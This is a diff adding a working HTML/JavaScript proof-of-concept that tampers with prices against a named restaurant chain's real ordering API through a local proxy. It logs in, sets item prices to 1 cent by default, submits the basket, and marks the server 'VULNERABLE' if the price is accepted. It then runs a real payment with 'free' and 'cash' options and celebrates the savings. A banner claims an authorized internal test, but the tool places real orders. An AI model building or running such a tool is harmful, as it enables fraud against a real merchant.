@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>O'Tacos PoC — price tampering (authorized internal test)</title>
+<style>
+  :root {
+    --red: #e21b1b;
+    --red-dark: #b91414;
+    --orange: #ff8a00;
+    --bg: #faf7f2;
+    --ink: #23201d;
+    --muted: #8a8580;
+    --card: #ffffff;
+    --line: #ece7e0;
+  }
+  * { box-sizing: border-box; }
+  body {
+    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+    max-width: 860px; margin: 0 auto; padding: 0 18px 60px;
+    background: var(--bg); color: var(--ink);
+  }
+  #loading-bar { position:fixed; top:0; left:0; height:3px; width:100%; background:transparent; z-index:999; }
+  #loading-bar .fill { height:100%; width:30%; background:linear-gradient(90deg,var(--orange),var(--red)); border-radius:3px; animation:loadmove 1s ease-in-out infinite; display:none; }
+  #loading-bar.active .fill { display:block; }
+  @keyframes loadmove { 0%{margin-left:-30%;} 50%{margin-left:70%;} 100%{margin-left:-30%;} }
+
+  header { padding: 22px 0 10px; display:flex; align-items:center; justify-content:space-between; }
+  h1 { font-size: 21px; margin:0; letter-spacing:-0.3px; }
+  h1 span { color: var(--red); }
+  #session-pill { font-size:12px; color:var(--muted); background:#fff; border:1px solid var(--line); padding:5px 10px; border-radius:20px; display:none; }
+  #session-pill.active { display:inline-flex; align-items:center; gap:6px; }
+  #session-pill button { padding:2px 8px; font-size:11px; margin:0; }
+
+  h2 { font-size: 15px; margin-top: 26px; color:var(--ink); display:flex; align-items:center; gap:8px; }
+  h2 .num { background:var(--red); color:#fff; width:20px; height:20px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-size:11px; }
+
+  .banner { background:#fff3cd; border:1px solid #e0c46b; padding:10px 14px; border-radius:8px; font-size:12.5px; margin:14px 0 4px; }
+  .step { display:none; animation: fadein .25s ease; }
+  .step.active { display:block; }
+  @keyframes fadein { from{opacity:0; transform:translateY(4px);} to{opacity:1; transform:none;} }
+
+  input, select, button { font-size:14px; padding:9px 10px; margin:4px 0; border-radius:7px; border:1px solid var(--line); }
+  input[type=text], input[type=password], input[type=number] { width: 260px; background:#fff; }
+  button { cursor:pointer; background:var(--red); color:#fff; border:none; padding:10px 18px; font-weight:600; transition:background .15s, transform .1s; }
+  button:hover { background:var(--red-dark); }
+  button:active { transform:scale(.97); }
+  button.secondary { background:#6b6660; }
+  button.secondary:hover { background:#524e49; }
+  button.small { padding:6px 11px; font-size:12px; }
+  button:disabled { background:#ddd; color:#999; cursor:default; }
+
+  .grid { display:grid; grid-template-columns: repeat(auto-fill, minmax(190px,1fr)); gap:12px; margin-top:10px; }
+  .card { border:1px solid var(--line); border-radius:12px; background:var(--card); overflow:hidden; display:flex; flex-direction:column; transition:transform .12s, box-shadow .12s; }
+  .card:hover { transform:translateY(-2px); box-shadow:0 6px 16px rgba(0,0,0,.08); }
+  .card img { width:100%; height:120px; object-fit:cover; background:#f0ece5; }
+  .card .body { padding:10px 12px; display:flex; flex-direction:column; gap:6px; flex:1; }
+  .card .title { font-size:13px; font-weight:700; min-height:32px; }
+  .card .price { font-size:12px; color:var(--muted); }
+  .card .compose-tag { display:inline-block; background:#fff0e0; color:var(--orange); font-size:10px; font-weight:700; padding:2px 7px; border-radius:10px; margin-left:5px; }
+
+  .skeleton { background:linear-gradient(90deg,#eee 25%,#f5f5f5 37%,#eee 63%); background-size:400% 100%; animation:shimmer 1.4s ease infinite; border-radius:8px; }
+  @keyframes shimmer { 0%{background-position:100% 50%;} 100%{background-position:0 50%;} }
+  .skel-card { height:190px; border-radius:12px; }
+
+  .store-row { display:flex; justify-content:space-between; align-items:center; padding:10px 12px; border:1px solid var(--line); border-radius:10px; margin:6px 0; background:var(--card); transition:box-shadow .12s; }
+  .store-row:hover { box-shadow:0 4px 10px rgba(0,0,0,.05); }
+
+  .opt-group { border:1px solid var(--line); border-radius:12px; padding:12px; margin:10px 0; background:var(--card); }
+  .opt-group h3 { margin:0 0 8px 0; font-size:14px; }
+  .opt-row { display:flex; align-items:center; gap:8px; padding:5px 2px; border-radius:6px; }
+  .opt-row:hover { background:#faf5ee; }
+  .opt-row img { width:34px; height:34px; object-fit:cover; border-radius:6px; background:#eee; }
+
+  .cart-line { display:flex; justify-content:space-between; align-items:center; padding:10px; border:1px solid var(--line); border-radius:10px; margin:6px 0; background:var(--card); }
+  .cart-line input[type=number] { width:90px; }
+
+  pre { background:#141210; color:#8bff8b; padding:12px; border-radius:8px; overflow:auto; font-size:12px; max-height:260px; }
+  .real { text-decoration: line-through; color:var(--muted); margin-right:6px; }
+  .tampered { color:var(--red); font-weight:bold; }
+  .ok { color:#1a7d1a; font-weight:bold; }
+  .fail { color:#b00; font-weight:bold; }
+
+  .total-bar { position:sticky; bottom:12px; background:#fff; border:1px solid var(--line); border-radius:12px; box-shadow:0 8px 24px rgba(0,0,0,.08); padding:12px 16px; margin-top:18px; display:flex; justify-content:space-between; align-items:center; }
+
+  .result-box { border-radius:10px; padding:12px 14px; margin-top:10px; font-size:13.5px; }
+  .result-box.vuln { background:#eafaea; border:1px solid #9fd89f; }
+  .result-box.notvuln { background:#fbe9e9; border:1px solid #eab0b0; }
+
+  #checkout-link { display:none; margin-top:8px; }
+
+  /* points shower */
+  #shower { position:fixed; inset:0; pointer-events:none; z-index:1000; overflow:hidden; }
+  .coin { position:absolute; top:-40px; font-size:26px; animation:fall linear forwards; }
+  @keyframes fall { to { transform: translateY(110vh) rotate(360deg); opacity:.2; } }
+  #shower-toast { position:fixed; top:18%; left:50%; transform:translate(-50%,-10px); background:#111; color:#fff; padding:14px 26px; border-radius:14px; font-size:18px; font-weight:800; z-index:1001; opacity:0; transition:opacity .25s, transform .25s; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,.3); }
+  #shower-toast.show { opacity:1; transform:translate(-50%,0); }
+
+  #order-banner .box { background:#fff8ea; border:1px solid #e8cf8e; border-radius:10px; padding:12px 14px; margin:14px 0; font-size:13px; display:flex; justify-content:space-between; align-items:center; gap:10px; flex-wrap:wrap; }
+  #order-banner .box.paid { background:#eafaea; border-color:#9fd89f; }
+  .step-tracker { display:flex; align-items:center; margin-top:10px; }
+  .step-node { display:flex; flex-direction:column; align-items:center; gap:4px; width:70px; }
+  .step-node .dot { width:14px; height:14px; border-radius:50%; background:#ddd; border:2px solid #ccc; }
+  .step-node.done .dot { background:var(--orange); border-color:var(--orange); }
+  .step-node.current .dot { background:var(--red); border-color:var(--red); box-shadow:0 0 0 4px rgba(226,27,27,.18); animation:pulse 1.4s ease-in-out infinite; }
+  @keyframes pulse { 0%,100%{box-shadow:0 0 0 4px rgba(226,27,27,.18);} 50%{box-shadow:0 0 0 8px rgba(226,27,27,.08);} }
+  .step-node .lbl { font-size:10px; color:var(--muted); text-align:center; }
+  .step-node.done .lbl, .step-node.current .lbl { color:var(--ink); font-weight:600; }
+  .step-line { flex:1; height:2px; background:#ddd; margin:0 -6px 18px; min-width:14px; }
+  .step-line.done { background:var(--orange); }
+  #poll-status { font-size:12px; color:var(--muted); margin-top:6px; }
+</style>
+</head>
+<body>
+
+<div id="loading-bar"><div class="fill"></div></div>
+<div id="shower"></div>
+<div id="shower-toast"></div>
+
+<header>
+  <h1><span>O'Tacos</span> PoC — price tampering</h1>
+  <span id="session-pill"><span id="session-email"></span> <button class="small secondary" onclick="logout()">Log out</button></span>
+</header>
+
+<div id="order-banner" style="display:none;"></div>
+
+<div class="banner">
+  Authorized internal security test against O'Tacos France's own API (<code>api.flyx.cloud</code>),
+  using a company-issued test account. This page runs entirely against your own local
+  proxy server — nothing here is public-facing.
+</div>
+
+<div id="step-login" class="step active">
+  <h2><span class="num">1</span> Login</h2>
+  <div><input id="email" type="text" placeholder="email" value="octomorto@gmail.com"></div>
+  <div><input id="password" type="password" placeholder="password"></div>
+  <button onclick="login()">Login</button>
+  <div id="login-2fa" style="display:none; margin-top:10px;">
+    <input id="code" type="text" placeholder="2FA code from email">
+    <button onclick="login2fa()">Submit code</button>
+  </div>
+</div>
+
+<div id="step-store" class="step">
+  <h2><span class="num">2</span> Pick a store</h2>
+  <div style="margin-bottom:8px;">
+    <label><input type="radio" name="ordertype" value="2" checked onchange="ORDER_TYPE=2"> Dine in</label>
+    &nbsp;&nbsp;
+    <label><input type="radio" name="ordertype" value="1" onchange="ORDER_TYPE=1"> Take out</label>
+  </div>
+  <input id="store-filter" type="text" placeholder="filter by city/name" oninput="renderStores()">
+  <div id="stores"></div>
+</div>
+
+<div id="step-menu" class="step">
+  <h2><span class="num">3</span> Menu — add items to cart</h2>
+  <input id="menu-filter" type="text" placeholder="filter menu" oninput="renderMenu()">
+  <div id="items" class="grid"></div>
+  <div class="total-bar">
+    <span id="cart-count">Cart: 0 items</span>
+    <button onclick="goToCart()">Go to cart / checkout</button>
+  </div>
+</div>
+
+<div id="step-wizard" class="step">
+  <h2>Compose: <span id="wizard-title"></span></h2>
+  <div id="wizard-groups"></div>
+  <button onclick="confirmWizard()">Add to cart</button>
+  <button class="secondary" onclick="cancelWizard()">Cancel</button>
+</div>
+
+<div id="step-cart" class="step">
+  <h2><span class="num">4</span> Cart — tamper the price, then check out <small id="cart-ordertype" style="color:var(--muted);font-weight:400;"></small></h2>
+  <div id="cart-lines"></div>
+  <button class="secondary small" onclick="backToMenu()">+ Add more items</button>
+  <div style="margin-top:14px;">
+    <button onclick="submitBasket()">Submit basket with these prices</button>
+  </div>
+  <div id="basket-result"></div>
+  <div id="payment-controls" style="display:none; margin-top:14px;">
+    Payment method:
+    <select id="method">
+      <option value="creditcard">creditcard (real Mollie flow)</option>
+      <option value="cash">cash</option>
+      <option value="free">free</option>
+    </select>
+    <button onclick="doPayment()">Run payment</button>
+    <div id="checkout-link"></div>
+  </div>
+</div>
+
+<div id="log"></div>
+
+<script>
+let TOKEN = null, STORES = [], ITEMS = [], GROUPS = [], SELECTED_STORE = null, BASKET_ID = null, ORDER_TYPE = 2;
+let CART = []; // { productId, title, image, realPrice, tamperedPrice, entities: [{modifierGroupId, entity:{id,type}}], optionSummary }
+let WIZARD_ITEM = null, WIZARD_SELECTIONS = {}; // groupId -> [optionId,...]
+let inflight = 0;
+
+function setLoading(on) {
+  inflight += on ? 1 : -1;
+  document.getElementById('loading-bar').classList.toggle('active', inflight > 0);
+}
+
+function logLine(label, status, obj) {
+  const div = document.getElementById('log');
+  const cls = (status >= 200 && status < 300) ? 'ok' : 'fail';
+  div.innerHTML = `<h2>Last response</h2><div class="${cls}">${label} — HTTP ${status}</div><pre>${escapeHtml(JSON.stringify(obj, null, 2))}</pre>` + div.innerHTML;
+}
+function escapeHtml(s){ return s.replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
+
+async function api(path, body) {
+  setLoading(true);
+  try {
+    const r = await fetch(path, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(body) });
+    const j = await r.json();
+    return { status: r.status, data: j };
+  } finally { setLoading(false); }
+}
+async function apiGet(path) {
+  setLoading(true);
+  try {
+    const r = await fetch(path);
+    const j = await r.json();
+    return { status: r.status, data: j };
+  } finally { setLoading(false); }
+}
+
+function showStep(id) {
+  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+// ---- points shower ----
+function pointsShower(text) {
+  const layer = document.getElementById('shower');
+  const emojis = ['🪙','⭐','🌮','💰','✨'];
+  for (let i = 0; i < 36; i++) {
+    const c = document.createElement('span');
+    c.className = 'coin';
+    c.textContent = emojis[Math.floor(Math.random()*emojis.length)];
+    c.style.left = Math.random()*100 + 'vw';
+    c.style.animationDuration = (1.6 + Math.random()*1.4) + 's';
+    c.style.fontSize = (18 + Math.random()*18) + 'px';
+    layer.appendChild(c);
+    setTimeout(() => c.remove(), 3200);
+  }
+  const toast = document.getElementById('shower-toast');
+  toast.textContent = text;
+  toast.classList.add('show');
+  setTimeout(() => toast.classList.remove('show'), 2400);
+}
+
+// ---- session persistence ----
+function saveSession() {
+  try {
+    localStorage.setItem('otacos_poc_session', JSON.stringify({ token: TOKEN, email: document.getElementById('email').value }));
+  } catch (e) {}
+}
+function logout() {
+  try { localStorage.removeItem('otacos_poc_session'); } catch (e) {}
+  location.reload();
+}
+
+// The GET Basket API never returns productId/title for line items (true for
+// every order, tampered or not) — so we remember what we actually ordered
+// client-side, the same way the real app's UI must, and look it up by basket id.
+function rememberBasketNames(basketId, cart) {
+  let map = {};
+  try { map = JSON.parse(localStorage.getItem('otacos_poc_basket_names') || '{}'); } catch (e) {}
+  map[basketId] = cart.map(l => l.title).join(', ');
+  try { localStorage.setItem('otacos_poc_basket_names', JSON.stringify(map)); } catch (e) {}
+}
+function lookupBasketNames(basketId) {
+  try {
+    const map = JSON.parse(localStorage.getItem('otacos_poc_basket_names') || '{}');
+    return map[basketId] || null;
+  } catch (e) { return null; }
+}
+async function tryResumeSession() {
+  let saved = null;
+  try { saved = JSON.parse(localStorage.getItem('otacos_poc_session') || 'null'); } catch (e) {}
+  if (!saved || !saved.token) return;
+  TOKEN = saved.token;
+  const pill = document.getElementById('session-pill');
+  pill.classList.add('active');
+  document.getElementById('session-email').textContent = saved.email || 'session';
+  // validate token still works
+  const { status } = await apiGet(`/api/stores?token=${encodeURIComponent(TOKEN)}`);
+  if (status === 200) {
+    goToStores();
+    checkOpenOrders();
+  } else {
+    logout();
+  }
+}
+window.addEventListener('DOMContentLoaded', tryResumeSession);
+
+// ---- order tracking ----
+// Real BasketStatus enum, recovered from the app's own bytecode (static analysis).
+const BASKET_STATUS = {
+  0: 'NEW', 1: 'INBASKET', 2: 'PAID', 3: 'PREPARING', 4: 'PREPARED',
+  5: 'CANCELED', 6: 'REFUNDED', 7: 'PICKEDUP', 9: 'TOPAY',
+  10: 'PREAPRINGNOTPAID', 11: 'ONTHEWAY', 12: 'PENDINGPAYMENT',
+};
+const STATUS_LABEL = {
+  NEW: 'New', INBASKET: 'In cart', PAID: 'Paid', PREPARING: 'Preparing',
+  PREPARED: 'Ready for pickup', CANCELED: 'Cancelled', REFUNDED: 'Refunded',
+  PICKEDUP: 'Picked up', TOPAY: 'Awaiting payment', PREAPRINGNOTPAID: 'Preparing (unpaid)',
+  ONTHEWAY: 'On the way', PENDINGPAYMENT: 'Payment pending',
+};
+const STATUS_ICON = {
+  NEW: '📝', INBASKET: '🛒', PAID: '✅', PREPARING: '👨‍🍳', PREPARED: '🥡',
+  CANCELED: '❌', REFUNDED: '↩️', PICKEDUP: '🎉', TOPAY: '💳',
+  PREAPRINGNOTPAID: '⚠️', ONTHEWAY: '🛵', PENDINGPAYMENT: '🕓',
+};
+// The normal happy-path progression, used to render a step tracker.
+const STEP_FLOW = ['PAID', 'PREPARING', 'PREPARED', 'PICKEDUP'];
+
+async function checkOpenOrders() {
+  const { status, data } = await apiGet(`/api/orders?token=${encodeURIComponent(TOKEN)}`);
+  const banner = document.getElementById('order-banner');
+  const orders = (data.orders || []).filter(o => o.totalAmount > 0);
+  if (status !== 200 || orders.length === 0) {
+    banner.style.display = 'none';
+    return;
+  }
+  const o = orders[0];
+  const key = BASKET_STATUS[o.status] || 'UNKNOWN';
+  const label = STATUS_LABEL[key] || `status ${o.status}`;
+  const icon = STATUS_ICON[key] || '🕓';
+  const terminal = key === 'CANCELED' || key === 'REFUNDED';
+  const paidLike = key !== 'NEW' && key !== 'INBASKET' && key !== 'TOPAY' && key !== 'PENDINGPAYMENT' && !terminal;
+  const stepIdx = STEP_FLOW.indexOf(key);
+
+  let stepper = '';
+  if (paidLike && stepIdx !== -1) {
+    stepper = `<div class="step-tracker">` + STEP_FLOW.map((s, i) => `
+      <div class="step-node ${i <= stepIdx ? 'done' : ''} ${i === stepIdx ? 'current' : ''}">
+        <div class="dot"></div><div class="lbl">${STATUS_LABEL[s]}</div>
+      </div>${i < STEP_FLOW.length - 1 ? '<div class="step-line '+(i < stepIdx ? 'done' : '')+'"></div>' : ''}`).join('') + `</div>`;
+  }
+
+  const names = lookupBasketNames(o.id);
+  banner.style.display = 'block';
+  banner.innerHTML = `<div class="box ${key === 'PAID' || key === 'PICKEDUP' ? 'paid' : ''}">
+    <div style="flex:1;">
+      <span>${icon} Open order <b>#${o.id}</b>${names ? ' — ' + names : ''} — store ${o.storeId} — total ${(o.totalAmount/100).toFixed(2)} EUR — <b>${label}</b></span>
+      ${stepper}
+    </div>
+    <span>
+      <button class="small secondary" onclick="checkOpenOrders()">Refresh</button>
+      ${terminal || key === 'PICKEDUP' ? '' : `<button class="small" onclick="cancelOrder(${o.id})">Cancel order</button>`}
+    </span>
+  </div>`;
+}
+async function cancelOrder(basketId) {
+  const { status, data } = await api('/api/cancel', { token: TOKEN, basketId });
+  logLine('cancel order', status, data);
+  if (status === 200) {
+    alert('Cancel request sent — see log for the server response (this endpoint is undocumented, may not always succeed).');
+  } else {
+    alert('Cancel failed — see log below for the server error.');
+  }
+  checkOpenOrders();
+}
+
+async function login() {
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  const { status, data } = await api('/api/login', { email, password });
+  logLine('login', status, data);
+  if (data.access_token) {
+    TOKEN = data.access_token;
+    saveSession();
+    document.getElementById('session-pill').classList.add('active');
+    document.getElementById('session-email').textContent = email;
+    goToStores();
+    checkOpenOrders();
+  } else if ((data.Errors || []).some(e => (e.errors||[]).some(x => (x.message||'').includes('two_factor')))) {
+    document.getElementById('login-2fa').style.display = 'block';
+  }
+}
+async function login2fa() {
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+  const code = document.getElementById('code').value;
+  const { status, data } = await api('/api/login2fa', { email, password, code });
+  logLine('login2fa', status, data);
+  if (data.access_token) {
+    TOKEN = data.access_token;
+    saveSession();
+    document.getElementById('session-pill').classList.add('active');
+    document.getElementById('session-email').textContent = email;
+    goToStores();
+    checkOpenOrders();
+  }
+}
+
+async function goToStores() {
+  showStep('step-store');
+  document.getElementById('stores').innerHTML = skeletonRows(6);
+  const { status, data } = await apiGet(`/api/stores?token=${encodeURIComponent(TOKEN)}`);
+  logLine('stores', status, data);
+  STORES = data.stores || [];
+  renderStores();
+}
+function skeletonRows(n) {
+  return Array.from({length:n}).map(() => `<div class="skeleton" style="height:40px;border-radius:10px;margin:6px 0;"></div>`).join('');
+}
+function skeletonCards(n) {
+  return Array.from({length:n}).map(() => `<div class="skeleton skel-card"></div>`).join('');
+}
+function renderStores() {
+  const q = document.getElementById('store-filter').value.toLowerCase();
+  const div = document.getElementById('stores');
+  div.innerHTML = '';
+  STORES.filter(s => !q || (s.title||'').toLowerCase().includes(q) || (s.city||'').toLowerCase().includes(q))
+    .slice(0, 40).forEach(s => {
+      const el = document.createElement('div');
+      el.className = 'store-row';
+      el.innerHTML = `<span>${s.title} (${s.city})</span>`;
+      const btn = document.createElement('button');
+      btn.className = 'small';
+      btn.textContent = 'Select';
+      btn.onclick = () => selectStore(s);
+      el.appendChild(btn);
+      div.appendChild(el);
+    });
+}
+async function selectStore(s) {
+  const { status, data } = await api('/api/canorder', { token: TOKEN, storeId: s.id, orderType: ORDER_TYPE });
+  logLine('canorder', status, data);
+  if (!(data.data)) { alert('Store not currently orderable for that dine-in/take-out mode, pick another or switch mode.'); return; }
+  SELECTED_STORE = s;
+  showStep('step-menu');
+  document.getElementById('items').innerHTML = skeletonCards(8);
+  const m = await apiGet(`/api/menu?token=${encodeURIComponent(TOKEN)}&storeId=${s.id}&orderType=${ORDER_TYPE}`);
+  logLine('menu', m.status, m.data);
+  ITEMS = m.data.items || [];
+  GROUPS = m.data.groups || [];
+  renderMenu();
+}
+function renderMenu() {
+  const q = document.getElementById('menu-filter').value.toLowerCase();
+  const div = document.getElementById('items');
+  div.innerHTML = '';
+  ITEMS.filter(it => !q || (it.title||'').toLowerCase().includes(q)).slice(0, 80).forEach(it => {
+    const card = document.createElement('div');
+    card.className = 'card';
+    const img = it.image ? `<img src="${it.image}" loading="lazy">` : `<div style="height:120px;background:#f0ece5;"></div>`;
+    card.innerHTML = `${img}<div class="body"><div class="title">${it.title}${it.composable ? '<span class="compose-tag">compose</span>' : ''}</div><div class="price">${(it.price/100).toFixed(2)} EUR</div></div>`;
+    const btn = document.createElement('button');
+    btn.className = 'small';
+    btn.textContent = it.composable ? 'Compose' : 'Add';
+    btn.onclick = () => it.composable ? openWizard(it) : addPlainToCart(it);
+    card.querySelector('.body').appendChild(btn);
+    div.appendChild(card);
+  });
+  document.getElementById('cart-count').textContent = `Cart: ${CART.length} item(s)`;
+}
+
+function addPlainToCart(it) {
+  CART.push({ productId: it.id, title: it.title, image: it.image, realPrice: it.price, tamperedPrice: 1, entities: [], optionSummary: '' });
+  document.getElementById('cart-count').textContent = `Cart: ${CART.length} item(s)`;
+}
+
+function openWizard(it) {
+  WIZARD_ITEM = it;
+  WIZARD_SELECTIONS = {};
+  document.getElementById('wizard-title').textContent = it.title;
+  const div = document.getElementById('wizard-groups');
+  div.innerHTML = '';
+  const groups = GROUPS.filter(g => it.groupIds.includes(g.id));
+  groups.forEach(g => {
+    WIZARD_SELECTIONS[g.id] = [];
+    const gdiv = document.createElement('div');
+    gdiv.className = 'opt-group';
+    gdiv.innerHTML = `<h3>${g.title} <small style="color:var(--muted);">(pick ${g.min}-${g.max})</small></h3>`;
+    g.options.forEach(opt => {
+      const row = document.createElement('div');
+      row.className = 'opt-row';
+      const inputType = g.max === 1 ? 'radio' : 'checkbox';
+      const img = opt.image ? `<img src="${opt.image}">` : '';
+      row.innerHTML = `<input type="${inputType}" name="grp-${g.id}" id="opt-${g.id}-${opt.id}" ${opt.default ? 'checked' : ''}> ${img} <label for="opt-${g.id}-${opt.id}">${opt.title}</label>`;
+      const input = row.querySelector('input');
+      input.onchange = () => toggleOption(g, opt, input);
+      if (opt.default) WIZARD_SELECTIONS[g.id].push({ id: opt.id, type: opt.type });
+      gdiv.appendChild(row);
+    });
+    div.appendChild(gdiv);
+  });
+  if (groups.length === 0) {
+    div.innerHTML = '<p style="color:var(--muted);font-size:13px;">No customizable options found for this item — adding as-is.</p>';
+  }
+  showStep('step-wizard');
+}
+function toggleOption(g, opt, input) {
+  let sel = WIZARD_SELECTIONS[g.id];
+  if (g.max === 1) {
+    sel = input.checked ? [{ id: opt.id, type: opt.type }] : [];
+  } else {
+    sel = sel.filter(s => s.id !== opt.id);
+    if (input.checked) sel.push({ id: opt.id, type: opt.type });
+  }
+  WIZARD_SELECTIONS[g.id] = sel;
+}
+function confirmWizard() {
+  const entities = [];
+  let summary = [];
+  for (const gid in WIZARD_SELECTIONS) {
+    WIZARD_SELECTIONS[gid].forEach(o => {
+      entities.push({ modifierGroupId: gid, entity: { id: o.id, type: o.type, isDefaultSelected: false } });
+      summary.push(o.id);
+    });
+  }
+  CART.push({
+    productId: WIZARD_ITEM.id, title: WIZARD_ITEM.title, image: WIZARD_ITEM.image,
+    realPrice: WIZARD_ITEM.price, tamperedPrice: 1, entities, optionSummary: summary.join(', '),
+  });
+  showStep('step-menu');
+  document.getElementById('cart-count').textContent = `Cart: ${CART.length} item(s)`;
+}
+function cancelWizard() { showStep('step-menu'); }
+
+function backToMenu() { showStep('step-menu'); }
+
+function goToCart() {
+  if (CART.length === 0) { alert('Cart is empty — add at least one item.'); return; }
+  showStep('step-cart');
+  document.getElementById('cart-ordertype').textContent = `(${ORDER_TYPE === 2 ? 'Dine in' : 'Take out'} @ ${SELECTED_STORE.title})`;
+  renderCart();
+}
+function renderCart() {
+  const div = document.getElementById('cart-lines');
+  div.innerHTML = '';
+  CART.forEach((line, idx) => {
+    const el = document.createElement('div');
+    el.className = 'cart-line';
+    const img = line.image ? `<img src="${line.image}" style="width:44px;height:44px;object-fit:cover;border-radius:8px;">` : '';
+    el.innerHTML = `
+      ${img}
+      <div style="flex:1;margin-left:10px;">
+        <div style="font-weight:600;">${line.title}</div>
+        <div style="font-size:11px;color:var(--muted);">${line.optionSummary || ''}</div>
+        <div><span class="real">${(line.realPrice/100).toFixed(2)} EUR</span></div>
+      </div>
+      <div>tampered (cents): <input type="number" value="${line.tamperedPrice}" data-idx="${idx}" onchange="updatePrice(${idx}, this.value)"></div>
+      <button class="small secondary" onclick="removeLine(${idx})">Remove</button>
+    `;
+    div.appendChild(el);
+  });
+}
+function updatePrice(idx, val) { CART[idx].tamperedPrice = parseInt(val || '1', 10); }
+function removeLine(idx) { CART.splice(idx, 1); renderCart(); }
+
+async function submitBasket() {
+  const items = CART.map(l => ({ productId: l.productId, priceCents: l.tamperedPrice, entities: l.entities, quantity: 1 }));
+  const { status, data } = await api('/api/basket', { token: TOKEN, storeId: SELECTED_STORE.id, orderType: ORDER_TYPE, items });
+  logLine('basket (tampered prices submit)', status, data);
+  const resDiv = document.getElementById('basket-result');
+  if (status === 200 && data.data) {
+    BASKET_ID = data.data.id;
+    rememberBasketNames(BASKET_ID, CART);
+    const stored = data.data.totalAmount;
+    const realTotal = CART.reduce((s, l) => s + l.realPrice, 0);
+    const tamperedTotal = CART.reduce((s, l) => s + l.tamperedPrice, 0);
+    const vulnerable = stored === tamperedTotal;
+    resDiv.innerHTML = `<div class="result-box ${vulnerable ? 'vuln' : 'notvuln'}">Basket ${BASKET_ID} created. Real total: ${(realTotal/100).toFixed(2)} EUR. We sent: ${(tamperedTotal/100).toFixed(2)} EUR. Server stored: ${(stored/100).toFixed(2)} EUR.<br>`
+      + (vulnerable ? '❗ VULNERABLE — server accepted tampered price verbatim.' : 'Server corrected the price.') + `</div>`;
+    document.getElementById('payment-controls').style.display = 'block';
+    if (vulnerable) {
+      const savedPct = realTotal > 0 ? Math.round(100 - (tamperedTotal/realTotal)*100) : 100;
+      pointsShower(`🎉 +${savedPct}% saved — €${(realTotal/100).toFixed(2)} → €${(tamperedTotal/100).toFixed(2)}`);
+    }
+  } else {
+    resDiv.innerHTML = `<div class="result-box notvuln">Basket submission failed, see log below.</div>`;
+  }
+}
+let pollTimer = null;
+
+async function doPayment() {
+  const method = document.getElementById('method').value;
+  const { status, data } = await api('/api/payment', { token: TOKEN, basketId: BASKET_ID, method });
+  logLine(`payment (method=${method})`, status, data);
+  const linkDiv = document.getElementById('checkout-link');
+  const checkoutUrl = data && data.data && data.data.checkout;
+  if (checkoutUrl) {
+    linkDiv.style.display = 'block';
+    linkDiv.innerHTML = `<a href="${checkoutUrl}" target="_blank" id="checkout-anchor"><button type="button">Payment page opened in a new tab →</button></a><div id="poll-status"></div>`;
+    // auto-open — real Mollie hosted page, this tab keeps polling for the result
+    window.open(checkoutUrl, '_blank');
+    pointsShower('💳 Real checkout page opened — complete it in the new tab');
+    startPaymentPoll();
+  } else if (status === 200 && data.data && data.data.transactionId) {
+    linkDiv.style.display = 'block';
+    linkDiv.innerHTML = `<div id="poll-status"></div>`;
+    pointsShower('✅ Transaction created');
+    startPaymentPoll();
+  } else {
+    linkDiv.style.display = 'none';
+  }
+}
+
+function startPaymentPoll() {
+  if (pollTimer) clearInterval(pollTimer);
+  let tries = 0;
+  const statusEl = () => document.getElementById('poll-status');
+  const tick = async () => {
+    tries++;
+    const { status, data } = await api('/api/basketstatus', { token: TOKEN, basketId: BASKET_ID });
+    const b = data && data.data;
+    if (status === 200 && b) {
+      const paid = (b.products || []).some(p => p.isPaid) || b.totalPayment >= b.totalAmount;
+      if (statusEl()) statusEl().textContent = `Checking payment status... (${tries}) totalPayment=${b.totalPayment} totalAmount=${b.totalAmount}`;
+      if (paid) {
+        clearInterval(pollTimer);
+        if (statusEl()) statusEl().innerHTML = `<span class="ok">✅ Order ${b.id} is PAID.</span>`;
+        pointsShower(`🎉 Payment confirmed on order #${b.id}!`);
+        checkOpenOrders();
+        return;
+      }
+    } else if (statusEl()) {
+      statusEl().textContent = `Checking payment status... (${tries})`;
+    }
+    if (tries >= 40) {
+      clearInterval(pollTimer);
+      if (statusEl()) statusEl().textContent = 'Stopped polling — check manually or click Refresh on the order banner.';
+    }
+  };
+  tick();
+  pollTimer = setInterval(tick, 4000);
+}
+</script>
+</body>
+</html>
